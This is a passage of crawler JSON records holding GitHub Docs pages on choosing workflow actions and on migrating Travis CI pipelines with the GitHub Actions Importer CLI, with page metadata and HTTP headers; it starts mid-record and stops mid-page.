  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does",
    "loadedTime": "2025-05-08T06:40:26.614Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does",
    "title": "Choosing what your workflow does - GitHub Docs",
    "description": "Workflows automate tasks in your software development lifecycle. Many tasks that you manually complete can be converted to a GitHub Actions workflow.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Choosing what your workflow does - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "A291:14FBA2:1C29E:23EA9:681C51D4",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:20 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686421.520393, VS0, VE404",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23785",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Choosing what your workflow does\nWorkflows automate tasks in your software development lifecycle. Many tasks that you manually complete can be converted to a GitHub Actions workflow.\nUsing pre-written building blocks in your workflow\nActions are the building blocks that power your workflow. A workflow can contain actions created by the community, or you can create your own actions directly within your application's repository. This guide will show you how to discover, use, and customize actions.\nStore information in variables\nGitHub sets default variables for each GitHub Actions workflow run. You can also set custom variables for use in a single workflow or multiple workflows.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-b5ch5.html",
  "markdown": "# Choosing what your workflow does\n\nWorkflows automate tasks in your software development lifecycle. Many tasks that you manually complete can be converted to a GitHub Actions workflow.\n\n## [Using pre-written building blocks in your workflow](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow)\n\nActions are the building blocks that power your workflow. A workflow can contain actions created by the community, or you can create your own actions directly within your application's repository. This guide will show you how to discover, use, and customize actions.\n\n## [Store information in variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables)\n\nGitHub sets default variables for each GitHub Actions workflow run. You can also set custom variables for use in a single workflow or multiple workflows.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 241,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 1056,
      "readableText": 1334,
      "none": 26349,
      "readableTextIfPossible": 26349,
      "result": 1334,
      "markdown": 958
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer",
    "loadedTime": "2025-05-08T06:40:28.219Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer",
    "title": "Migrating from Travis CI with GitHub Actions Importer - GitHub Docs",
    "description": "Learn how to use GitHub Actions Importer to automate the migration of your Travis CI pipelines to GitHub Actions.",
    "author": null,
    "keywords": "Migration,CI,CD",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Migrating from Travis CI with GitHub Actions Importer - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "B14E:148852:1EB3D:267A5:681C51D5",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:21 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686421.318492, VS0, VE464",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "35747",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Migrating from Travis CI with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your Travis CI pipelines to GitHub Actions.\nLegal notice\nAbout migrating from Travis CI with GitHub Actions Importer\nThe instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Travis CI pipelines to GitHub Actions.\nPrerequisites\nA Travis CI account or organization with pipelines and jobs that you want to convert to GitHub Actions workflows.\nAccess to create a Travis CI API access token for your account or organization.\nAn environment where you can run Linux-based containers, and can install the necessary tools. \nDocker is installed and running.\nGitHub CLI is installed.\nNote\nThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.\nLimitations\nThere are some limitations when migrating from Travis CI pipelines to GitHub Actions with GitHub Actions Importer.\nManual tasks\nCertain Travis CI constructs must be migrated manually. These include:\nSecrets\nUnknown job properties\nFor more information on manual migrations, see Migrating from Travis CI to GitHub Actions.\nTravis CI project languages\nGitHub Actions Importer transforms Travis CI project languages by adding a set of preconfigured build tools and a default build script to the transformed workflow. If no language is explicitly declared, GitHub Actions Importer assumes a project language is Ruby.\nFor a list of the project languages supported by GitHub Actions Importer, see Supported project languages.\nInstalling the GitHub Actions Importer CLI extension\nInstall the GitHub Actions Importer CLI extension:\nBash\ngh extension install github/gh-actions-importer \nVerify that the extension is installed:\n$ gh actions-importer -h Options: -?, -h, --help Show help and usage information Commands: update Update to the latest version of GitHub Actions Importer. version Display the version of GitHub Actions Importer. configure Start an interactive prompt to configure credentials used to authenticate with your CI server(s). audit Plan your CI/CD migration by analyzing your current CI/CD footprint. forecast Forecast GitHub Actions usage from historical pipeline utilization. dry-run Convert a pipeline to a GitHub Actions workflow and output its yaml file. migrate Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes. \nConfiguring credentials\nThe configure CLI command is used to set required credentials and options for GitHub Actions Importer when working with Travis CI and GitHub.\nCreate a GitHub personal access token (classic). For more information, see Managing your personal access tokens.\nYour token must have the workflow scope.\nAfter creating the token, copy it and save it in a safe location for later use.\nCreate a Travis CI API access token. For more information, see Get your Travis CI API token in the Travis CI documentation.\nAfter creating the token, copy it and save it in a safe location for later use.\nIn your terminal, run the GitHub Actions Importer configure CLI command:\ngh actions-importer configure \nThe configure command will prompt you for the following information:\nFor \"Which CI providers are you configuring?\", use the arrow keys to select Travis CI, press Space to select it, then press Enter.\nFor \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and press Enter.\nFor \"Base url of the GitHub instance\", press Enter to accept the default value (https://github.com).\nFor \"Personal access token for Travis CI\", enter the value for the Travis CI API access token that you created earlier, and press Enter.\nFor \"Base url of the Travis CI instance\", enter the URL of your Travis CI instance, and press Enter.\nFor \"Travis CI organization name\", enter the name of your Travis CI organization, and press Enter.\nAn example of the output of the configure command is shown below.\n$ gh actions-importer configure ✔ Which CI providers are you configuring?: Travis CI Enter the following values (leave empty to omit): ✔ Personal access token for GitHub: *************** ✔ Base url of the GitHub instance: https://github.com ✔ Personal access token for Travis CI: *************** ✔ Base url of the Travis CI instance: https://travis-ci.com ✔ Travis CI organization name: actions-importer-labs Environment variables successfully updated. \nIn your terminal, run the GitHub Actions Importer update CLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:\ngh actions-importer update \nThe output of the command should be similar to below:\nUpdating ghcr.io/actions-importer/cli:latest... ghcr.io/actions-importer/cli:latest up-to-date \nPerform an audit of Travis CI\nYou can use the audit command to get a high-level view of all pipelines in a Travis CI server.\nThe audit command performs the following steps:\nFetches all of the projects defined in a Travis CI server.\nConverts each pipeline to its equivalent GitHub Actions workflow.\nGenerates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer.\nRunning the audit command\nTo perform an audit of a Travis CI server, run the following command in your terminal:\ngh actions-importer audit travis-ci --output-dir tmp/audit \nInspecting the audit results\nThe files in the specified output directory contain the results of the audit. See the audit_summary.md file for a summary of the audit results.\nThe audit summary has the following sections.\nPipelines\nThe \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer.\nListed below are some key terms that can appear in the \"Pipelines\" section:\nSuccessful pipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.\nPartially successful pipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.\nUnsupported pipelines are definition types that are not supported by GitHub Actions Importer.\nFailed pipelines encountered a fatal error when being converted. This can occur for one of three reasons: \nThe pipeline was originally misconfigured and not valid.\nGitHub Actions Importer encountered an internal error when converting it.\nThere was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.\nBuild steps\nThe \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer.\nListed below are some key terms that can appear in the \"Build steps\" section:\nA known build step is a step that was automatically converted to an equivalent action.\nAn unknown build step is a step that was not automatically converted to an equivalent action.\nAn unsupported build step is a step that is either: \nFundamentally not supported by GitHub Actions.\nConfigured in a way that is incompatible with GitHub Actions.\nAn action is a list of the actions that were used in the converted workflows. This can be important for: \nIf you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.\nDefining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.\nManual tasks\nThe \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually.\nListed below are some key terms that can appear in the \"Manual tasks\" section:\nA secret is a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, see Using secrets in GitHub Actions.\nA self-hosted runner refers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly.\nFiles\nThe final section of the audit report provides a manifest of all the files that were written to disk during the audit.\nEach pipeline file has a variety of files included in the audit, including:\nThe original pipeline as it was defined in GitHub.\nAny network responses used to convert the pipeline.\nThe converted workflow file.\nStack traces that can be used to troubleshoot a failed pipeline conversion.\nAdditionally, the workflow_usage.csv file contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews.\nForecast potential build runner usage\nYou can use the forecast command to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Travis CI server.\nRunning the forecast command\nTo perform a forecast of potential GitHub Actions usage, run the following command in your terminal. By default, GitHub Actions Importer includes the previous seven days in the forecast report.\ngh actions-importer forecast travis-ci --output-dir tmp/forecast \nInspecting the forecast report\nThe forecast_report.md file in the specified output directory contains the results of the forecast.\nListed below are some key terms that can appear in the forecast report:\nThe job count is the total number of completed jobs.\nThe pipeline count is the number of unique pipelines used.\nExecution time describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners. \nThis metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use the GitHub Actions pricing calculator to estimate the costs.\nQueue time metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\nConcurrent jobs metrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure.\nAdditionally, these metrics are defined for each queue of runners in Travis CI. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners.\nPerform a dry-run migration of a Travis CI pipeline\nYou can use the dry-run command to convert a Travis CI pipeline to an equivalent GitHub Actions workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\nTo perform a dry run of migrating your Travis CI pipelines to GitHub Actions, run the following command in your terminal, replacing my-travis-ci-repository with the name of your Travis CI repository.\ngh actions-importer dry-run travis-ci --travis-ci-repository my-travis-ci-repository --output-dir tmp/dry-run \nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\nIf there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, see Extending GitHub Actions Importer with custom transformers.\nPerform a production migration of a Travis CI pipeline\nYou can use the migrate command to convert a Travis CI pipeline and open a pull request with the equivalent GitHub Actions workflow.\nRunning the migrate command\nTo migrate a Travis CI pipeline to GitHub Actions, run the following command in your terminal, replacing the target-url value with the URL for your GitHub repository, and my-travis-ci-repository with the name of your Travis CI repository.\ngh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository \nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n$ gh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository [2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log' [2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1' \nInspecting the pull request\nThe output from a successful run of the migrate command contains a link to the new pull request that adds the converted workflow to your repository.\nSome important elements of the pull request include:\nIn the pull request description, a section called Manual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.\nThe converted workflows file. Select the Files changed tab in the pull request to view the workflow file that will be added to your GitHub repository.\nWhen you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository.\nReference\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Travis CI.\nUsing environment variables\nGitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using the configure command. For more information, see the Configuring credentials section.\nGitHub Actions Importer uses the following environment variables to connect to your Travis CI instance:\nGITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a converted workflow (requires the workflow scope).\nGITHUB_INSTANCE_URL: The URL to the target GitHub instance (for example, https://github.com).\nTRAVIS_CI_ACCESS_TOKEN: The Travis CI API access token used to view Travis CI resources.\nTRAVIS_CI_ORGANIZATION: The organization name of your Travis CI instance.\nTRAVIS_CI_INSTANCE_URL: The URL of the Travis CI instance.\nTRAVIS_CI_SOURCE_GITHUB_ACCESS_TOKEN: (Optional) The personal access token used to authenticate with your source GitHub instance. If not provided, GITHUB_ACCESS_TOKEN will be used instead.\nTRAVIS_CI_SOURCE_GITHUB_INSTANCE_URL: (Optional) The URL to the source GitHub instance, such as https://github.com. If not provided, GITHUB_INSTANCE_URL will be used instead.\nThese environment variables can be specified in a .env.local file that is loaded by GitHub Actions Importer when it is run.\nUsing optional arguments\nThere are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration.\n--source-file-path\nYou can use the --source-file-path argument with the forecast, dry-run, or migrate subcommands.\nBy default, GitHub Actions Importer fetches pipeline contents from source control. The --source-file-path argument tells GitHub Actions Importer to use the specified source file path instead.\nFor example:\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --source-file-path ./path/to/.travis.yml \n--allow-inactive-repositories\nYou can use this argument to specify whether GitHub Actions Importer should include inactive repositories in an audit. If this option is not set, inactive repositories are not included in audits.\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --allow-inactive-repositories \n--config-file-path\nYou can use the --config-file-path argument with the audit, dry-run, and migrate subcommands.\nBy default, GitHub Actions Importer fetches pipeline contents from source control. The --config-file-path argument tells GitHub Actions Importer to use the specified source files instead.\nAudit example\nIn this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit.\ngh actions-importer audit travis-ci --output-dir ./path/to/output/ --config-file-path ./path/to/travis-ci/config.yml \nTo audit a Travis CI instance using a configuration file, the file must be in the following format and each repository_slug value must be unique:\nsource_files: - repository_slug: travis-org-name/travis-repo-name path: path/to/.travis.yml - repository_slug: travis-org-name/some-other-travis-repo-name path: path/to/.travis.yml \nDry run example\nIn this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform a dry run.\nThe pipeline is selected by matching the repository_slug in the configuration file to the value of the --travis-ci-repository option. The path is then used to pull the specified source file.\ngh actions-importer dry-run travis-ci --travis-ci-repository travis-org-name/travis-repo-name --output-dir ./output/ --config-file-path ./path/to/travis-ci/config.yml \nSupported project languages\nGitHub Actions Importer supports migrating Travis CI projects in the following languages.\nandroid\nbash\nc\nclojure\nc++\ncrystal\nc#\nd\ndart\nelixir\nerlang\ngeneric\ngo\ngroovy\nhaskell\nhaxe\njava\njulia\nmatlab\nminimal\nnix\nnode_js\nobjective-c\nperl\nperl6\nphp\npython\nr\nruby\nrust\nscala\nsh\nshell\nsmalltalk\nswift\nSupported syntax for Travis CI pipelines\nThe following table shows the type of properties GitHub Actions Importer is currently able to convert. For more details about how Travis CI pipeline syntax aligns with GitHub Actions, see Migrating from Travis CI to GitHub Actions.\nTravis CIGitHub ActionsStatus\nbranches\t\non.<push>.<branches>\n\tSupported\t\nbuild_pull_requests\t\non.<pull_request>\n\tSupported\t\nenv\t\nenv\njobs.<job_id>.env\njobs.<job_id>.steps.env\n\tSupported\t\nif\t\njobs.<job_id>.if\n\tSupported\t\njob\t\njobs.<job_id>\njobs.<job_id>.name\n\tSupported\t\nmatrix\t\njobs.<job_id>.strategy\njobs.<job_id>.strategy.fail-fast\njobs.<job_id>.strategy.matrix\n\tSupported\t\nos & dist\t\nrunners\n\tSupported\t\nscripts\t\njobs.<job_id>.steps\n\tSupported\t\nstages\t\njobs\n\tSupported\t\nenv\t\non\n\tPartially supported\t\nbranches\t\non.<push>.<tags>\non.<push>.paths\n\tUnsupported\t\nbuild_pull_requests\t\non.<pull_request>.<branches>\non.<pull_request>.<tags>\non.<pull_request>.paths\n\tUnsupported\t\ncron triggers\t\non.schedule\non.workflow_run\n\tUnsupported\t\nenv\t\njobs.<job_id>.timeout-minutes\non.<event_name>.types\n\tUnsupported\t\njob\t\njobs.<job_id>.container\n\tUnsupported\t\nos & dist\t\nself hosted runners\n\tUnsupported\t\nFor information about supported Travis CI constructs, see the github/gh-actions-importer repository.\nEnvironment variables syntax\nGitHub Actions Importer uses the mapping in the table below to convert default Travis CI environment variables to the closest equivalent in GitHub Actions.\nTravis CIGitHub Actions\n$CONTINUOUS_INTEGRATION\t$CI\t\n$USER\t${{ github.actor }}\t\n$HOME\t${{ github.workspace }}\t\n$TRAVIS_BRANCH\t${{ github.ref }}\t\n$TRAVIS_BUILD_DIR\t${{ github.workspace }}\t\n$TRAVIS_BUILD_ID\t${{ github.run_number }}\t\n$TRAVIS_BUILD_NUMBER\t${{ github.run_id }}\t\n$TRAVIS_COMMIT\t${{ github.sha }}\t\n$TRAVIS_EVENT_TYPE\t${{ github.event_name }}\t\n$TRAVIS_PULL_REQUEST_BRANCH\t${{ github.base_ref }}\t\n$TRAVIS_PULL_REQUEST\t${{ github.event.number }}\t\n$TRAVIS_PULL_REQUEST_SHA\t${{ github.head.sha }}\t\n$TRAVIS_PULL_REQUEST_SLUG\t${{ github.repository }}\t\n$TRAVIS_TAG\t${{ github.ref }}\t\n$TRAVIS_OS_NAME\t${{ runner.os }}\t\n$TRAVIS_JOB_ID\t${{ github.job }}\t\n$TRAVIS_REPO_SLUG\t${{ github.repository_owner/github.repository }}\t\n$TRAVIS_BUILD_WEB_URL\t${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\t\nLegal notice\nPortions have been adapted from https://github.com/github/gh-actions-importer/ under the MIT license:\nMIT License Copyright (c) 2022 GitHub Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-travis-ci-with-gith-rzyla.html",
  "markdown": "# Migrating from Travis CI with GitHub Actions Importer\n\nLearn how to use GitHub Actions Importer to automate the migration of your Travis CI pipelines to GitHub Actions.\n\n[Legal notice](#legal-notice)\n\n## [About migrating from Travis CI with GitHub Actions Importer](#about-migrating-from-travis-ci-with-github-actions-importer)\n\nThe instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Travis CI pipelines to GitHub Actions.\n\n### [Prerequisites](#prerequisites)\n\n*   A Travis CI account or organization with pipelines and jobs that you want to convert to GitHub Actions workflows.\n*   Access to create a Travis CI API access token for your account or organization.\n*   An environment where you can run Linux-based containers, and can install the necessary tools.\n    \n    *   Docker is [installed](https://docs.docker.com/get-docker/) and running.\n        \n    *   [GitHub CLI](https://cli.github.com/) is installed.\n        \n    \n    Note\n    \n    The GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.\n    \n\n### [Limitations](#limitations)\n\nThere are some limitations when migrating from Travis CI pipelines to GitHub Actions with GitHub Actions Importer.\n\n#### [Manual tasks](#manual-tasks)\n\nCertain Travis CI constructs must be migrated manually. These include:\n\n*   Secrets\n*   Unknown job properties\n\nFor more information on manual migrations, see [Migrating from Travis CI to GitHub Actions](https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions).\n\n#### [Travis CI project languages](#travis-ci-project-languages)\n\nGitHub Actions Importer transforms Travis CI project languages by adding a set of preconfigured build tools and a default build script to the transformed workflow. If no language is explicitly declared, GitHub Actions Importer assumes a project language is Ruby.\n\nFor a list of the project languages supported by GitHub Actions Importer, see [Supported project languages](#supported-project-languages).\n\n## [Installing the GitHub Actions Importer CLI extension](#installing-the-github-actions-importer-cli-extension)\n\n1.  Install the GitHub Actions Importer CLI extension:\n    \n    Bash\n    \n    ```\n    gh extension install github/gh-actions-importer\n    ```\n    \n2.  Verify that the extension is installed:\n    \n    ```\n    $ gh actions-importer -h\n    Options:\n      -?, -h, --help  Show help and usage information\n    \n    Commands:\n      update     Update to the latest version of GitHub Actions Importer.\n      version    Display the version of GitHub Actions Importer.\n      configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n      audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n      forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n      dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n      migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes.\n    ```\n    \n\n## [Configuring credentials](#configuring-credentials)\n\nThe `configure` CLI command is used to set required credentials and options for GitHub Actions Importer when working with Travis CI and GitHub.\n\n1.  Create a GitHub personal access token (classic). For more information, see [Managing your personal access tokens](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#creating-a-personal-access-token-classic).\n    \n    Your token must have the `workflow` scope.\n    \n    After creating the token, copy it and save it in a safe location for later use.\n    \n2.  Create a Travis CI API access token. For more information, see [Get your Travis CI API token](https://docs.travis-ci.com/user/migrate/travis-migrate-to-apps-gem-guide/#4-get-your-travis-ci-api-token) in the Travis CI documentation.\n    \n    After creating the token, copy it and save it in a safe location for later use.\n    \n3.  In your terminal, run the GitHub Actions Importer `configure` CLI command:\n    \n    ```\n    gh actions-importer configure\n    ```\n    \n    The `configure` command will prompt you for the following information:\n    \n    *   For \"Which CI providers are you configuring?\", use the arrow keys to select `Travis CI`, press Space to select it, then press Enter.\n    *   For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and press Enter.\n    *   For \"Base url of the GitHub instance\", press Enter to accept the default value (`https://github.com`).\n    *   For \"Personal access token for Travis CI\", enter the value for the Travis CI API access token that you created earlier, and press Enter.\n    *   For \"Base url of the Travis CI instance\", enter the URL of your Travis CI instance, and press Enter.\n    *   For \"Travis CI organization name\", enter the name of your Travis CI organization, and press Enter.\n    \n    An example of the output of the `configure` command is shown below.\n    \n    ```\n    $ gh actions-importer configure\n    ✔ Which CI providers are you configuring?: Travis CI\n    Enter the following values (leave empty to omit):\n    ✔ Personal access token for GitHub: ***************\n    ✔ Base url of the GitHub instance: https://github.com\n    ✔ Personal access token for Travis CI: ***************\n    ✔ Base url of the Travis CI instance: https://travis-ci.com\n    ✔ Travis CI organization name: actions-importer-labs\n    Environment variables successfully updated.\n    ```\n    \n4.  In your terminal, run the GitHub 